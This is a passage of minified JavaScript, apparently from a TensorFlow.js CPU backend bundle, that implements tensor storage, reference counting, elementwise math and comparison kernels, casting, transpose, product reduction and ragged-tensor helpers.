                dtype: s,
                refCount: 1
            }),
            o
        }
        makeTensorInfo(t, e, s) {
            let o;
            if ("string" === e && null != s && s.length > 0 && Cr(s[0])) {
                const r = s.map((i=>bs(i)));
                o = this.write(r, t, e)
            } else
                o = this.write(s, t, e);
            return {
                dataId: o,
                shape: t,
                dtype: e
            }
        }
        refCount(t) {
            return this.data.has(t) ? this.data.get(t).refCount : 0
        }
        incRef(t) {
            this.data.get(t).refCount++
        }
        decRef(t) {
            if (this.data.has(t)) {
                this.data.get(t).refCount--
            }
        }
        move(t, e, s, o, r) {
            this.data.set(t, {
                values: e,
                dtype: o,
                refCount: r
            })
        }
        numDataIds() {
            return this.data.numDataIds()
        }
        async read(t) {
            return this.readSync(t)
        }
        readSync(t) {
            const {dtype: e, complexTensorInfos: s} = this.data.get(t);
            if ("complex64" === e) {
                return as(this.readSync(s.real.dataId), this.readSync(s.imag.dataId))
            }
            return function ow(n, t) {
                if (Array.isArray(n))
                    return n;
                if ("float32" === t)
                    return n instanceof Float32Array ? n : new Float32Array(n);
                if ("int32" === t)
                    return n instanceof Int32Array ? n : new Int32Array(n);
                if ("bool" === t || "string" === t)
                    return Uint8Array.from(new Int32Array(n));
                throw new Error(`Unknown dtype ${t}`)
            }(this.data.get(t).values, e)
        }
        bufferSync(t) {
            const e = this.readSync(t.dataId);
            if ("string" === t.dtype)
                try {
                    const s = e.map((o=>xs(o)));
                    return wt(t.shape, t.dtype, s)
                } catch {
                    throw new Error("Failed to decode encoded string bytes into utf-8")
                }
            return wt(t.shape, t.dtype, e)
        }
        makeOutput(t, e, s) {
            return zt().makeTensorFromTensorInfo(this.makeTensorInfo(e, s, t), this)
        }
        disposeData(t, e=!1) {
            if (this.data.has(t)) {
                if (this.data.get(t).refCount--,
                !e && this.data.get(t).refCount > 0)
                    return !1;
                const {complexTensorInfos: s} = this.data.get(t);
                null != s && (this.disposeData(s.real.dataId, !0),
                this.disposeData(s.imag.dataId, !0)),
                this.data.delete(t)
            }
            return !0
        }
        disposeIntermediateTensorInfo(t) {
            this.disposeData(t.dataId)
        }
        async time(t) {
            const e = Ve();
            return t(),
            {
                kernelMs: Ve() - e
            }
        }
        memory() {
            return {
                unreliable: !0,
                reasons: ["The reported memory is an upper bound. Due to automatic garbage collection, the true allocated memory may be less."]
            }
        }
        where(t) {
            it([t], "where");
            const e = this.readSync(t.dataId);
            return LG(t.shape, e)
        }
        dispose() {}
        floatPrecision() {
            return 32
        }
        epsilon() {
            return super.epsilon()
        }
    }
    function Zx(n) {
        const t = new Float32Array(n.length);
        for (let e = 0; e < n.length; ++e)
            t[e] = Math.abs(n[e]);
        return t
    }
    hl.nextDataId = 0;
    const EG = {
        kernelName: ya,
        backendName: "cpu",
        kernelFunc: n=>{
            const {x: t} = n.inputs
              , e = n.backend;
            it(t, "abs");
            let s = new Float32Array(Z(t.shape));
            return s = Zx(e.data.get(t.dataId).values),
            e.makeOutput(s, t.shape, t.dtype)
        }
    };
    function oe(n) {
        return (t,e,s,o,r)=>{
            const i = gt(t, e)
              , a = i.length
              , c = ct(i)
              , u = Se(r, Z(i))
              , d = t.length
              , h = e.length
              , p = ct(t)
              , f = ct(e)
              , m = Uo(t, i)
              , g = Uo(e, i);
            if (m.length + g.length === 0)
                for (let b = 0; b < u.length; ++b)
                    u[b] = n(s[b % s.length], o[b % o.length]);
            else
                for (let b = 0; b < u.length; ++b) {
                    const x = Vo(b, a, c)
                      , I = x.slice(-d);
                    m.forEach((k=>I[k] = 0));
                    const y = Fn(I, d, p)
                      , w = x.slice(-h);
                    g.forEach((k=>w[k] = 0));
                    const C = Fn(w, h, f);
                    u[b] = n(s[y], o[C])
                }
            return [u, i]
        }
    }
    function Qe(n) {
        const {inputs: t, backend: e} = n
          , {real: s, imag: o} = t
          , r = e.data.get(s.dataId).values
          , i = e.data.get(o.dataId).values
          , a = e.makeTensorInfo(s.shape, "complex64");
        return e.data.get(a.dataId).complexTensorInfos = {
            real: e.makeTensorInfo(s.shape, "float32", r),
            imag: e.makeTensorInfo(o.shape, "float32", i)
        },
        a
    }
    const DG = {
        kernelName: lu,
        backendName: "cpu",
        kernelFunc: Qe
    };
    function pl(n, t, e="float32") {
        if ("complex64" === e) {
            return Qe({
                inputs: {
                    real: pl(n, t, "float32"),
                    imag: pl(n, t, "float32")
                },
                backend: n
            })
        }
        const s = ke(Z(t), e);
        return n.makeTensorInfo(t, e, s)
    }
    function Qn(n) {
        const {inputs: t, backend: e} = n
          , {x: s} = t;
        return e.incRef(s.dataId),
        {
            dataId: s.dataId,
            shape: s.shape,
            dtype: s.dtype
        }
    }
    const WG = {
        kernelName: Kr,
        backendName: "cpu",
        kernelFunc: Qn
    };
    function yo(n) {
        const {inputs: t, backend: e} = n
          , {input: s} = t
          , o = e.data.get(s.dataId).complexTensorInfos.real
          , r = e.data.get(o.dataId).values;
        return e.makeTensorInfo(o.shape, o.dtype, r)
    }
    const MG = {
        kernelName: Mu,
        backendName: "cpu",
        kernelFunc: yo
    };
    function Bx(n, t, e, s) {
        if ("int32" === s) {
            return [t, "int32", Int32Array.from(n)]
        }
        if ("bool" === s) {
            const o = Ys([0], e)
              , [r,i] = oe(((a,c)=>a !== c ? 1 : 0))(t, [], n, o, "bool");
            return [i, "bool", r]
        }
        throw new Error(`Error in Cast: failed to cast ${e} to ${s}`)
    }
    function Ws(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {x: o} = t
          , {dtype: r} = s;
        if ("complex64" === r) {
            if ("complex64" === o.dtype)
                return Qn({
                    inputs: {
                        x: o
                    },
                    backend: e
                });
            const u = pl(e, o.shape, o.dtype)
              , d = Ws({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    dtype: "float32"
                }
            })
              , h = Qe({
                inputs: {
                    real: d,
                    imag: u
                },
                backend: e
            });
            return e.disposeIntermediateTensorInfo(u),
            e.disposeIntermediateTensorInfo(d),
            h
        }
        if ("complex64" === o.dtype) {
            const u = yo({
                inputs: {
                    input: o
                },
                backend: e
            })
              , d = Ws({
                inputs: {
                    x: u
                },
                backend: e,
                attrs: {
                    dtype: r
                }
            });
            return e.disposeIntermediateTensorInfo(u),
            d
        }
        if (!hf(o.dtype, r)) {
            const u = Qn({
                inputs: {
                    x: o
                },
                backend: e
            });
            return {
                dataId: u.dataId,
                shape: u.shape,
                dtype: r
            }
        }
        const i = e.data.get(o.dataId).values
          , [a,c,l] = Bx(i, o.shape, o.dtype, r);
        return e.makeTensorInfo(a, c, l)
    }
    const VG = {
        kernelName: Gr,
        backendName: "cpu",
        kernelFunc: Ws
    };
    function pe(n, t, e, s) {
        return null == e ? ({inputs: o, backend: r})=>{
            const {a: i, b: a} = o
              , c = r;
            it([i, a], n);
            const l = c.data.get(i.dataId).values
              , u = c.data.get(a.dataId).values
              , d = "string" === i.dtype ? cs(l) : l
              , h = "string" === i.dtype ? cs(u) : u
              , p = s || i.dtype
              , [f,m] = t(i.shape, a.shape, d, h, p);
            return c.makeTensorInfo(m, p, f)
        }
        : ({inputs: o, backend: r})=>{
            const {a: i, b: a} = o
              , c = r;
            if ("complex64" === i.dtype || "complex64" === a.dtype) {
                const l = Ws({
                    inputs: {
                        x: i
                    },
                    backend: c,
                    attrs: {
                        dtype: "complex64"
                    }
                })
                  , u = c.data.get(l.dataId)
                  , d = u.complexTensorInfos.real
                  , h = u.complexTensorInfos.imag
                  , p = c.data.get(d.dataId).values
                  , f = c.data.get(h.dataId).values
                  , m = Ws({
                    inputs: {
                        x: a
                    },
                    backend: c,
                    attrs: {
                        dtype: "complex64"
                    }
                })
                  , g = c.data.get(m.dataId)
                  , b = g.complexTensorInfos.real
                  , x = g.complexTensorInfos.imag
                  , I = c.data.get(b.dataId).values
                  , y = c.data.get(x.dataId).values
                  , [w,C,k] = e(i.shape, a.shape, p, f, I, y)
                  , S = c.makeTensorInfo(k, "float32", w)
                  , T = c.makeTensorInfo(k, "float32", C)
                  , R = Qe({
                    inputs: {
                        real: S,
                        imag: T
                    },
                    backend: c
                });
                return c.disposeIntermediateTensorInfo(l),
                c.disposeIntermediateTensorInfo(m),
                c.disposeIntermediateTensorInfo(S),
                c.disposeIntermediateTensorInfo(T),
                R
            }
            {
                const l = c.data.get(i.dataId).values
                  , u = c.data.get(a.dataId).values
                  , d = s || i.dtype
                  , [h,p] = t(i.shape, a.shape, l, u, d);
                return c.makeTensorInfo(p, d, h)
            }
        }
    }
    function lp(n) {
        return (t,e,s,o,r,i)=>{
            const a = gt(t, e)
              , c = Z(a)
              , l = a.length
              , u = ct(a)
              , d = Se("float32", c)
              , h = Se("float32", c)
              , p = Uo(t, a)
              , f = Uo(e, a)
              , m = as(s, o)
              , g = as(r, i)
              , b = t.length
              , x = ct(t)
              , I = e.length
              , y = ct(e);
            if (p.length + f.length === 0)
                for (let w = 0; w < d.length; w++) {
                    const C = w % m.length
                      , k = w % g.length
                      , S = n(m[2 * C], m[2 * C + 1], g[2 * k], g[2 * k + 1]);
                    d[w] = S.real,
                    h[w] = S.imag
                }
            else
                for (let w = 0; w < d.length; w++) {
                    const C = Vo(w, l, u)
                      , k = C.slice(-b);
                    p.forEach((V=>k[V] = 0));
                    const S = Fn(k, b, x)
                      , T = C.slice(-I);
                    f.forEach((V=>T[V] = 0));
                    const R = Fn(T, I, y)
                      , L = n(m[2 * S], m[2 * S + 1], g[2 * R], g[2 * R + 1]);
                    d[w] = L.real,
                    h[w] = L.imag
                }
            return [d, h, a]
        }
    }
    const Hx = oe(((n,t)=>n + t))
      , FG = lp(((n,t,e,s)=>({
        real: n + e,
        imag: t + s
    })))
      , ir = pe(Fo, Hx, FG)
      , zG = {
        kernelName: Fo,
        backendName: "cpu",
        kernelFunc: ir
    };
    function up(n, t, e, s, o) {
        const r = Z(s)
          , i = ke(o, e);
        for (let a = 0; a < n.length; a++) {
            const c = n[a];
            if (c < 0)
                throw new Error("Input x must be non-negative!");
            c >= o || (i[c] += r > 0 ? t[a] : 1)
        }
        return i
    }
    function _x(n, t, e, s=!1) {
        const o = n.shape[0]
          , r = n.shape[1]
          , i = wt([o, e], t.dtype);
        for (let a = 0; a < o; a++)
            for (let c = 0; c < r; c++) {
                const l = n.get(a, c);
                if (l < 0)
                    throw new Error("Input x must be non-negative!");
                l >= e || (s ? i.set(1, a, l) : t.size > 0 ? i.set(i.get(a, l) + t.get(a, c), a, l) : i.set(i.get(a, l) + 1, a, l))
            }
        return i
    }
    const Ux = oe(((n,t)=>n & t))
      , AG = {
        kernelName: cu,
        backendName: "cpu",
        kernelFunc: pe(cu, Ux)
    };
    function Jn(n) {
        return (t,e,s)=>{
            const o = qt(e, t.length);
            for (let r = 0; r < t.length; ++r)
                o[r] = n(t[r], s);
            return o
        }
    }
    function Et(n, t, e) {
        return Ms(n, Jn(t), e)
    }
    function Ms(n, t, e) {
        return ({inputs: s, attrs: o, backend: r})=>{
            const {x: i} = s;
            it(i, n);
            const a = r
              , c = a.data.get(i.dataId).values;
            let l;
            if ("string" === i.dtype) {
                if (!Array.isArray(c))
                    throw new Error("String tensor's value was not an instance of Array");
                l = cs(c)
            } else
                l = c;
            const u = e || i.dtype
              , d = t(l, u, o);
            return a.makeTensorInfo(i.shape, u, d)
        }
    }
    const Yx = Jn((n=>Math.ceil(n)))
      , PG = Ms(Lr, Yx)
      , OG = {
        kernelName: Lr,
        backendName: "cpu",
        kernelFunc: PG
    };
    function Qx(n, t, e, s) {
        const o = qt(e, Z(t));
        if (s && "string" !== e) {
            let r = 0;
            n.forEach((i=>{
                const a = Z(i.shape);
                o.set(i.vals, r),
                r += a
            }
            ))
        } else {
            let r = 0;
            n.forEach((i=>{
                const a = "string" === e ? cs(i.vals) : i.vals;
                let c = 0;
                for (let l = 0; l < i.shape[0]; ++l) {
                    const u = l * t[1] + r;
                    for (let d = 0; d < i.shape[1]; ++d)
                        o[u + d] = a[c++]
                }
                r += i.shape[1]
            }
            ))
        }
        return o
    }
    const Jx = oe(((n,t)=>n === t ? 1 : 0))
      , jx = pe(Wa, Jx, null, "bool")
      , KG = {
        kernelName: Wa,
        backendName: "cpu",
        kernelFunc: jx
    }
      , qx = Jn((n=>Math.exp(n)))
      , ty = Ms(zr, qx, "float32")
      , ZG = {
        kernelName: zr,
        backendName: "cpu",
        kernelFunc: ty
    }
      , ey = Jn((n=>Math.expm1(n)))
      , BG = Ms(Xr, ey)
      , HG = {
        kernelName: Xr,
        backendName: "cpu",
        kernelFunc: BG
    }
      , ny = Jn((n=>Math.floor(n)))
      , _G = Ms(Ar, ny)
      , UG = {
        kernelName: Ar,
        backendName: "cpu",
        kernelFunc: _G
    }
      , sy = oe(((n,t)=>Math.floor(n / t)))
      , YG = pe(Pr, sy, null, "int32")
      , QG = {
        kernelName: Pr,
        backendName: "cpu",
        kernelFunc: YG
    };
    function oy(n, t, e, s, o, r, i, a, c) {
        const l = wt([s, r], e);
        for (let u = 0; u < s; u++) {
            const d = [];
            let h = 0;
            for (let p = 0; p < o; p++) {
                const f = n[u * o + p];
                h += f * i[p],
                d.push(f)
            }
            if (h < 0 || h >= c / r)
                throw new Error(`Invalid indices: ${d} does not index into ${a}`);
            for (let p = 0; p < r; p++)
                l.values[u * r + p] = t.get(...t.indexToLoc(h * r + p))
        }
        return l
    }
    function ry(n, t, e) {
        const s = wt(e, n.dtype);
        for (let o = 0; o < s.size; ++o) {
            const i = s.indexToLoc(o).slice()
              , a = i[0]
              , c = i[2]
              , l = t.locToIndex([a, c]);
            i[2] = t.values[l];
            const u = n.locToIndex(i);
            0 <= u && u < n.values.length && (s.values[o] = n.values[u])
        }
        return s
    }
    const iy = oe(((n,t)=>n > t ? 1 : 0))
      , JG = pe(za, iy, null, "bool")
      , jG = {
        kernelName: za,
        backendName: "cpu",
        kernelFunc: JG
    }
      , ay = oe(((n,t)=>n >= t ? 1 : 0))
      , qG = pe(Or, ay, null, "bool")
      , tL = {
        kernelName: Or,
        backendName: "cpu",
        kernelFunc: qG
    }
      , cy = oe(((n,t)=>n < t ? 1 : 0))
      , eL = pe(Aa, cy, null, "bool")
      , nL = {
        kernelName: Aa,
        backendName: "cpu",
        kernelFunc: eL
    }
      , ly = oe(((n,t)=>n <= t ? 1 : 0))
      , sL = pe(Pa, ly, null, "bool")
      , oL = {
        kernelName: Pa,
        backendName: "cpu",
        kernelFunc: sL
    };
    function uy(n, t, e) {
        const s = (t - n) / (e - 1)
          , o = ke(e, "float32");
        o[0] = n;
        for (let r = 1; r < o.length; r++)
            o[r] = o[r - 1] + s;
        return o
    }
    const dy = Jn((n=>Math.log(n)))
      , rL = Ms(_r, dy)
      , iL = {
        kernelName: _r,
        backendName: "cpu",
        kernelFunc: rL
    };
    function hy(n, t, e, s) {
        const o = Se(s, Z(e));
        for (let r = 0; r < o.length; ++r) {
            const i = r * t;
            let a = n[i];
            for (let c = 0; c < t; ++c) {
                const l = n[i + c];
                (Number.isNaN(l) || l > a) && (a = l)
            }
            o[r] = a
        }
        return o
    }
    const py = oe(((n,t)=>Math.max(n, t)))
      , aL = pe(Yr, py)
      , cL = {
        kernelName: Yr,
        backendName: "cpu",
        kernelFunc: aL
    }
      , fy = oe(((n,t)=>Math.min(n, t)))
      , lL = pe(Qr, fy)
      , uL = {
        kernelName: Qr,
        backendName: "cpu",
        kernelFunc: lL
    }
      , dp = oe(((n,t)=>n * t))
      , dL = lp(((n,t,e,s)=>({
        real: n * e - t * s,
        imag: n * s + t * e
    })))
      , fl = pe(jr, dp, dL)
      , hL = {
        kernelName: jr,
        backendName: "cpu",
        kernelFunc: fl
    };
    function my(n, t, e) {
        const s = gs(-1, e);
        return dp([], t, s, n, e)
    }
    const fL = {
        kernelName: ja,
        backendName: "cpu",
        kernelFunc: function pL(n) {
            const {inputs: t, backend: e} = n
              , {x: s} = t;
            it(s, "neg");
            const o = e.data.get(s.dataId).values
              , [r,i] = my(o, s.shape, s.dtype);
            return e.makeTensorInfo(i, s.dtype, r)
        }
    }
      , gy = oe(((n,t)=>n !== t ? 1 : 0))
      , mL = pe(qa, gy, null, "bool")
      , gL = {
        kernelName: qa,
        backendName: "cpu",
        kernelFunc: mL
    };
    function hp(n, t, e, s, o) {
        const r = t.length
          , i = Z(t)
          , a = ct(t)
          , c = ct(o)
          , l = Se(e, Z(o));
        for (let u = 0; u < i; ++u) {
            const d = Vo(u, r, a)
              , h = new Array(d.length);
            for (let f = 0; f < h.length; f++)
                h[f] = d[s[f]];
            l[Fn(h, r, c)] = n[u]
        }
        return l
    }
    function Ke(n) {
        const {inputs: t, attrs: e, backend: s} = n
          , {x: o} = t
          , {perm: r} = e;
        it(o, "transpose");
        const i = o.shape.length
          , a = new Array(i);
        for (let d = 0; d < a.length; d++)
            a[d] = o.shape[r[d]];
        const l = hp(s.data.get(o.dataId).values, o.shape, o.dtype, r, a);
        return {
            dataId: s.write(l, a, o.dtype),
            shape: a,
            dtype: o.dtype
        }
    }
    const bL = {
        kernelName: zo,
        backendName: "cpu",
        kernelFunc: Ke
    };
    function by(n, t, e, s) {
        const [o,r] = me(n, s)
          , i = _e(t, "int32")
          , a = ke(Z(o), i)
          , c = Z(r);
        for (let l = 0; l < a.length; ++l) {
            const u = l * c;
            let d = 1;
            for (let h = 0; h < c; ++h)
                d *= e[u + h];
            a[l] = d
        }
        return {
            outVals: a,
            outShape: o,
            outDtype: i
        }
    }
    const yL = {
        kernelName: rc,
        backendName: "cpu",
        kernelFunc: function xL(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {axis: r, keepDims: i} = s;
            it(o, "prod");
            const a = o.shape.length
              , c = It(r, o.shape)
              , l = Yt(c, a);
            let u = c
              , d = o;
            const h = [];
            null != l && (d = Ke({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    perm: l
                }
            }),
            h.push(d),
            u = ee(u.length, a));
            const p = e.data.get(d.dataId).values
              , {outVals: f, outShape: m, outDtype: g} = by(d.shape, d.dtype, p, u);
            let b = m;
            return i && (b = re(m, c)),
            h.forEach((x=>e.disposeIntermediateTensorInfo(x))),
            e.makeTensorInfo(b, g, f)
        }
    };
    function CL(n, t, e, s) {
        const o = [];
        let r = 0;
        const i = t.length - 1 + e.length
          , a = new Array(i).fill(null).map((()=>[0]));
        !function wL(n, t) {
            for (let e = 0; e < n.length; ++e) {
                const s = n[e]
                  , o = e === n.length - 1 ? t : n[e + 1].length;
                if (0 === s.length)
                    throw new Error("Ragged splits may not be empty");
                if (s[0] < 0)
                    throw new Error("Ragged splits must be non-negative");
                if (s[s.length - 1] > o)
                    throw new Error("Ragged splits must not point past values");
                for (let r = 1; r < s.length; ++r)
                    if (s[r - 1] > s[r])
                        throw new Error("Ragged splits must be sorted in ascending order")
            }
        }(e, s);
        let c = 1;
        for (let l = 0; l < t.length - 1; ++l) {
            c *= t[l];
            const u = t[l + 1];
            for (let d = 1; d < c + 1; ++d)
                a[l].push(d * u)
        }
        for (let l = 0; l < n.length; ++l) {
            let u = n[l]
              , d = n[l] + 1;
            for (let h = 0; h < e.length; ++h) {
                const p = e[h]
                  , f = h + t.length - 1;
                if (f >= 0) {
                    const m = a[f]
                      , g = m[m.length - 1] - p[u];
                    for (let b = u; b < d; ++b)
                        a[f].push(p[b + 1] + g)
                }
                u = p[u],
                d = p[d]
            }
            d !== u && (o.push([u, d]),
            r += d - u)
        }
        return {
            outSplits: a,
            valueSlices: o,
            numValues: r
        }
    }
    function xy(n, t) {
        const e = n.slice(0, t);
        for (; e.length < t; )
            e.push(1);
        for (let s = t; s < n.length; s++)
            e[t - 1] *= n[s];
        return e
    }
    function kL(n, t, e, s, o) {
        const r = t.slice();
        r[0] = o;
        const i = qt(e, Z(r))
          , a = n.length;
        return function SL(n, t, e, s, o, r) {
            const i = xy(t, 2)[1]
              , a = xy(r, 2)[1];
            let c = 0;
            for (const l of e)
                for (let u = l[0]; u < l[1]; ++u) {
                    for (let d = 0; d < s; ++d)
                        o[c * a + d] = n[u * i + d];
                    ++c
                }
        }(n, t, s, 0 === a ? 0 : a / t[0], i, r),
        [i, r]
    }
    function yy(n, t, e, s, o, r, i, a) {
        if (0 === n.length)
            throw new Error("paramsNestedSplits must be non empty");
        if (0 === t[0].length)
            throw new Error("Split tensors must not be scalars");
        if (function IL(n, t, e) {
            n.forEach(((s,o)=>{
                if (s < 0 || s >= e) {
                    const r = Vo(o, t.length, ct(t)).join(",");
                    throw new Error(`indices[${r}] = ${s} is not in [0, ${e})`)
                }
            }
            ))
        }(r, i, t[0][0] - 1),
        0 === s.length)
            throw new Error("params.rank must be nonzero");
        const l = s[0]
          , {outSplits: u, valueSlices: d, numValues: h} = CL(r, i, n, l)
          , p = function vL(n) {
            const t = [];
            for (let e = 0; e < n.length; ++e) {
                const o = qt("int32", n[e].length);
                t.push(o),
                n[e].forEach(((r,i)=>o[i] = r))
            }
            return t
        }(u)
          , f = kL(e, s, o, d, h);
        return [p, f[0], f[1]]
    }
    const Iy = 2147483647;
    function wy(n, t, e, s, o, r, i) {
        if (t.length > 1)
            throw new Error("starts must be a scalar or vector");
        if (o.length > 1)
            throw new Error("limits must be a scalar or vector");
        if (i.length > 1)
            throw new Error("deltas must be a scalar or vector");
        const a = 0 === t.length
          , c = 0 === o.length
          , l = 0 === i.length
          , u = [];
        a || u.push(t[0]),
        c || u.push(o[0]),
        l || u.push(i[0]);
        for (let g = 1; g < u.length; ++g)
            if (u[g] !== u[g - 1])
                throw new Error("starts, limits, and deltas must have the same shape");
        const d = 0 === u.length ? 1 : u[0]
          , h = qt("int32", d + 1);
        h[0] = 0;
        for (let g = 0; g < d; ++g) {
            const b = a ? n[0] : n[g]
              , x = c ? s[0] : s[g]
              , I = l ? r[0] : r[g];
            if (0 === I)
                throw new Error("Requires delta != 0");
            let y;
            if (I > 0 && x < b || I < 0 && x > b)
                y = 0;
            else if (y = Math.ceil(Math.abs((x - b) / I)),
            y > Iy)
                throw new Error(`Requires ((limit - start) / delta) <= ${Iy}`);
            h[g + 1] = h[g] + y
        }
        const f = qt(e, h[d]);
        let m = 0;
        for (let g = 0; g < d; ++g) {
            const b = h[g + 1] - h[g];
            let x = a ? n[0] : n[g];
            const I = l ? r[0] : r[g];
            for (let y = 0; y < b; ++y)
                f[m++] = x,
                x += I
        }
        return [h, f]
    }
    var In = Rn;
    class ml {
        constructor(t, e, s, o, r, i, a, c, l, u) {
            this.shape = t,
            this.shapeShape = e,
            this.values = s,
            this.valuesShape = o,
            this.valuesDType = r,
            this.defaultValue = i,
            this.defaultValueShape = a,
            this.rowPartitionValues = c,
            this.rowPartitionValuesShapes = l,
            this.rowPartitionTypes = Ng(u),
            this.raggedRank = Rg(this.rowPartitionTypes)
        }
        getRowPartitionTypeByDimension(t) {
            return this.rowPartitionTypes[0] === In.FIRST_DIM_SIZE ? this.rowPartitionTypes[t + 1] : this.rowPartitionTypes[t]
        }
        getRowPartitionTensor(t) {
            return this.rowPartitionTypes[0] === In.FIRST_DIM_SIZE ? this.rowPartitionValues[t + 1] : this.rowPartitionValues[t]
        }
        getMaxWidth(t) {
            const e = this.getRowPartitionTensor(t - 1);
            switch (this.getRowPartitionTypeByDimension(t - 1)) {
            case In.VALUE_ROWIDS:
                return ml.getMaxWidthValueRowID(e);
            case In.ROW_SPLITS:
                return ml.getMaxWidthRowSplit(e);
            default:
                throw new Error(`Cannot handle partition type ${In[this.getRowPartitionTypeByDimension(t - 1)]}`)
            }
        }
        static getMaxWidthRowSplit(t) {
            const e = t.length;
            if (0 === e || 1 === e)
                return 0;
            let s = 0;
            for (let o = 0; o < e - 1; ++o) {
                const r = t[o + 1] - t[o];
                r > s && (s = r)
            }
            return s
        }
        static getMaxWidthValueRowID(t) {
            const e = t.length;
            if (0 === e)
                return 0;
            let s = 0
              , o = t[0]
              , r = 0;
            for (let i = 1; i < e; ++i) {
                const a = t[i];
                a !== o && (o = a,
                r = Math.max(i - s, r),
                s = i)
            }
            return Math.max(e - s, r)
        }
        tensorShapeFromTensor(t, e, s=!0) {
            if (0 === e.length) {
                if (-1 === t[0])
                    return [];
                throw new Error("The only valid scalar shape tensor is the fully unknown shape specified as -1.")
            }
            return vy(t, s)
        }
        calculateOutputSize(t) {
            const e = this.valuesShape;
            $g(this.defaultValueShape, e);
            const o = this.tensorShapeFromTensor(this.shape, this.shapeShape)
              , i = Tg(this.raggedRank, o, e);
            i[0] < 0 && (i[0] = t);
            for (let a = 1; a <= this.raggedRank; ++a)
                i[a] < 0 && (i[a] = this.getMaxWidth(a));
            return i
        }
        calculateFirstParentOutputIndex(t, e, s) {
            const o = Math.min(t, s)
              , r = [];
            let i = 0;
            for (let a = 0; a < o; ++a,
            i += e)
                r.push(i);
            for (let a = o; a < t; ++a)
                r.push(-1);
            return v(r.length === t, (()=>"Final length of result must be equal to firstDimension.")),
            r
        }
        calculateOutputIndexRowSplit(t, e, s, o) {
            const r = t.length
              , i = [];
            for (let a = 0; a < r - 1; ++a) {
                const c = t[a + 1] - t[a];
                let l = Math.min(o, c)
                  , u = e[a];
                -1 === u && (l = 0);
                for (let d = 0; d < l; ++d)
                    i.push(u),
                    u += s;
                for (let d = 0; d < c - l; ++d)
                    i.push(-1)
            }
            if (r > 0 && i.length !== t[r - 1])
                throw new Error("Invalid row split size.");
            return i
        }
        calculateOutputIndexValueRowID(t, e, s, o) {
            const r = t.length
              , i = [];
            if (0 === r)
                return [];
            let a = 0
              , c = t[0];
            if (c >= e.length)
                throw new Error(`Got currentValueRowId=${c}, which is not less than ${e.length}`);
            let l = e[c];
            i.push(l);
            for (let u = 1; u < r; ++u) {
                const d = t[u];
                if (d === c)
                    l >= 0 && (++a,
                    a < o ? l += s : l = -1);
                else {
                    if (a = 0,
                    c = d,
                    d >= e.length)
                        throw new Error(`Got nextValueRowId=${d} which is not less than ${e.length}`);
                    l = e[d]
                }
                i.push(l)
            }
            if (i.length !== t.length)
                throw new Error("Invalid row ids.");
            return i
        }
        calculateOutputIndex(t, e, s, o) {
            const r = this.getRowPartitionTensor(t)
              , i = this.getRowPartitionTypeByDimension(t);
            switch (i) {
            case In.VALUE_ROWIDS:
                return this.calculateOutputIndexValueRowID(r, e, s, o);
            case In.ROW_SPLITS:
                if (r.length - 1 > e.length)
                    throw new Error(`Row partition size is greater than output size: ${r.length - 1} > ${e.length}`);
                return this.calculateOutputIndexRowSplit(r, e, s, o);
            default:
                throw new Error(`Unsupported partition type: ${In[i]}`)
            }
        }
        getFirstDimensionSize() {
            const t = this.rowPartitionValues[0];
            if (0 === this.rowPartitionTypes.length)
                throw new Error("No row_partition_types given.");
            const e = this.rowPartitionTypes[0];
            switch (e) {
            case In.FIRST_DIM_SIZE:
                return t[0];
            case In.VALUE_ROWIDS:
                throw new Error("Cannot handle VALUE_ROWIDS in first dimension.");
            case In.ROW_SPLITS:
                return this.rowPartitionValuesShapes[0][0] - 1;
            default:
                throw new Error(`Cannot handle type ${In[e]}`)
            }
        }
        compute() {
            if (this.rowPartitionValues[0].length <= 0)
                throw new Error("Invalid first partition input. Tensor requires at least one element.");
            const e = this.getFirstDimensionSize()
              , s = this.calculateOutputSize(e)
              , o = new Array(this.raggedRank + 1);
            o[o.length - 1] = 1;
            for (let c = o.length - 2; c >= 0; --c)
                o[c] = o[c + 1] * s[c + 1];
            const r = vy(s, !1)
              , i = qt(this.valuesDType, Z(r));
            if (o[0] * s[0] > 0) {
                let c = this.calculateFirstParentOutputIndex(e, o[0], s[0]);
                for (let l = 1; l <= this.raggedRank; ++l)
                    c = this.calculateOutputIndex(l - 1, c, o[l], s[l]);
                this.setOutput(this.raggedRank, c, i, r)
            }
            return [r, i]
        }
        setOutput(t, e, s, o) {
            if (0 === s.length)
                return;
            const r = this.values
              , i = s;
            let a = o.slice();
            a = a.slice(t + 1);
            const c = Z(a)
              , l = e.length;
            let u = this.defaultValue;
            if (u.length !== c && 1 !== u.length) {
                const f = this.defaultValueShape;
                M((()=>{
                    const m = W(u, f);
                    u = Ni(m, a).dataSync()
                }
                ))
            }
            let d = 0
              , h = 0
              , p = 0;
            for (let f = 0; f <= l; ++f) {
                let m = f < l ? e[f] : -1;
                if (m !== p) {
                    if (h < p) {
                        const g = r.subarray(d * c);
                        Cy(i.subarray(h * c), g, (p - h) * c)
                    }
                    if (f >= l) {
                        const g = s.length;
                        m = Math.floor(g / c)
                    }
                    if (m > p)
                        if (1 === this.defaultValue.length)
                            i.subarray(p * c, m * c).fill(this.defaultValue[0]),
                            p = m;
                        else
                            for (; m > p; ) {
                                Cy(i.slice(p * c), u, c),
                                ++p
                            }
                    m < 0 ? (d = f + 1,
                    h = p) : (d = f,
                    h = p,
                    p = h + 1)
                } else
                    ++p
            }
        }
    }
    function Cy(n, t, e) {
        for (let s = 0; s < e; s++)
            n[s] = t[s]
    }
    function vy(n, t) {
        const e = [];
        for (let s of n) {
            if (s < 0) {
                if (!t)
                    throw new Error(`Dimension ${s} must be >= 0`);
                if (s < -1)
                    throw new Error(`Dimension ${s} must be >= -1`);
                s = -1
            }
            e.push(s)
        }
        return e
    }
    function Sy(n, t, e, s, o, r, i, a, c, l) {
        return new ml(n,t,e,s,o,r,i,a,c,l).compute()
    }
    function ky(n, t, e, s) {
        if (n === t || n < t && e < 0 || t < n && e > 1)
            return ke(0, s);
        const c = ke(Math.abs(Math.ceil((t - n) / e)), s);
        t < n && 1 === e && (e = -1),
        c[0] = n;
        for (let l = 1; l < c.length; l++)
            c[l] = c[l - 1] + e;
        return c
    }
    const Ty = Jn((n=>1 / Math.sqrt(n)))
      , TL = Ms(oi, Ty)
      , NL = {
        kernelName: oi,
        backendName: "cpu",
        kernelFunc: TL
    };
    function Io(n, t, e, s, o, r, i, a, c, l) {
        const u = [s / o, o]
          , d = n.values
          , h = t.values;
        if (0 === s)
